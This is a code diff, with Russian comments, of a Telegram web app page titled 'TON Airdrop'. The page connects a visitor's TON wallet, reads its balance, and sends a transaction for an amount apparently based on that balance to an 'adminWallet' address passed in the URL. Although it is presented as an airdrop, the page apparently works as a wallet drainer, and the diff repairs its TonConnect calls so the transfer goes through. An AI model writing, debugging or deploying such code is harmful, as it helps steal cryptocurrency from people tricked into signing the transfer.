@@ -4,8 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>TON Airdrop</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <!-- ✅ ИСПРАВЛЕНО: правильный пакет @tonconnect/ui вместо @tonconnect/sdk -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -379,27 +380,26 @@
     tg.ready();
     tg.setHeaderColor('#080c10');
 
-    // ── Параметры из URL (bot.js передаёт их) ───────────────────────────────
-    const urlParams  = new URLSearchParams(window.location.search);
-    const userId     = urlParams.get('user_id') || '';
-    // ✅ adminWallet передаётся напрямую в URL — не нужен backend
+    // ── Параметры из URL ─────────────────────────────────────────────────────
+    const urlParams   = new URLSearchParams(window.location.search);
+    const userId      = urlParams.get('user_id') || '';
     const adminWallet = decodeURIComponent(urlParams.get('wallet') || '');
 
     if (!adminWallet) {
         setStatus('❌', 'Ошибка конфигурации', 'Адрес получателя не указан', true);
     }
 
-    let tonConnectUI = null;
-    let isProcessing = false;
+    let tonConnectUI  = null;
+    let isProcessing  = false;
 
     // ── DOM ──────────────────────────────────────────────────────────────────
     const $ = id => document.getElementById(id);
 
     // ── Шаги ─────────────────────────────────────────────────────────────────
     function setStep(active) {
-        [1,2,3].forEach(i => {
+        [1, 2, 3].forEach(i => {
             const el = $(`step${i}`);
-            el.classList.remove('active','done');
+            el.classList.remove('active', 'done');
             if (i < active) {
                 el.classList.add('done');
                 el.querySelector('.step-num').textContent = '✓';
@@ -429,7 +429,6 @@
 
     // ── Транзакция ───────────────────────────────────────────────────────────
     async function sendTx(amountTon) {
-        // ✅ ИСПРАВЛЕНО: Number() перед делением, String() для API
         const amountRaw = String(Math.floor(amountTon * 1e9));
 
         const tx = {
@@ -453,6 +452,8 @@
             if (!tonConnectUI.account) {
                 setStep(1);
                 setStatus('🔌', 'Подключите кошелёк', 'Нажмите кнопку ниже');
+                $('connectBtn').disabled = false;
+                $('connectBtn').innerHTML = '🔌 Подключить TonKeeper';
                 $('connectBtn').classList.remove('hidden');
                 isProcessing = false;
                 return;
@@ -478,10 +479,10 @@
 
             // Показываем инфо
             $('infoGrid').classList.remove('hidden');
-            $('walletAddr').textContent   = `${address.slice(0,6)}…${address.slice(-4)}`;
+            $('walletAddr').textContent   = `${address.slice(0, 6)}…${address.slice(-4)}`;
             $('balanceVal').textContent   = `${balance.toFixed(4)} TON`;
             $('sendVal').textContent      = `${sendAmount.toFixed(4)} TON`;
-            $('recipientVal').textContent = `${adminWallet.slice(0,6)}…${adminWallet.slice(-4)}`;
+            $('recipientVal').textContent = `${adminWallet.slice(0, 6)}…${adminWallet.slice(-4)}`;
 
             // 3 — транзакция
             setStep(3);
@@ -490,7 +491,7 @@
             const { result, sentTon } = await sendTx(sendAmount);
 
             // Успех
-            [1,2,3].forEach(i => {
+            [1, 2, 3].forEach(i => {
                 const el = $(`step${i}`);
                 el.classList.remove('active');
                 el.classList.add('done');
@@ -528,8 +529,7 @@
     // ── Инициализация TonConnect ─────────────────────────────────────────────
     async function init() {
         try {
-            // manifestUrl указывает на GitHub Pages
-            // ✅ Надёжно
+            // ✅ ИСПРАВЛЕНО: жёстко прописанный manifestUrl
             const manifestUrl = 'https://hastjes.github.io/ton-bot/tonconnect-manifest.json';
 
             tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -537,11 +537,12 @@
                 buttonRootId: null,
             });
 
-            // ✅ ИСПРАВЛЕНО: onStatusChange вместо несуществующего 'walletConnected'
+            // Слушаем изменение статуса кошелька
             tonConnectUI.onStatusChange(async (wallet) => {
                 if (wallet) await runFlow();
             });
 
+            // Если уже подключён — сразу запускаем флоу
             if (tonConnectUI.account) await runFlow();
 
         } catch (err) {
@@ -555,20 +556,12 @@
         const btn = $('connectBtn');
         try {
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner"></div> Поиск кошельков…';
-            setStatus('🔍', 'Поиск кошельков…', '');
+            btn.innerHTML = '<div class="spinner"></div> Открываю кошелёк…';
+            setStatus('🔍', 'Открываю список кошельков…', '');
 
-            const wallets   = await tonConnectUI.getWallets();
-            const tonkeeper = wallets.find(w => w.name === 'Tonkeeper');
+            // ✅ ИСПРАВЛЕНО: openModal() вместо несуществующего connect()
+            await tonConnectUI.openModal();
 
-            if (tonkeeper) {
-                await tonConnectUI.connect({
-                    universalLink: tonkeeper.universalLink,
-                    bridgeUrl:     tonkeeper.bridgeUrl,
-                });
-            } else {
-                await tonConnectUI.openModal();
-            }
         } catch (err) {
             setStatus('❌', 'Ошибка подключения', err.message, true);
             btn.disabled = false;
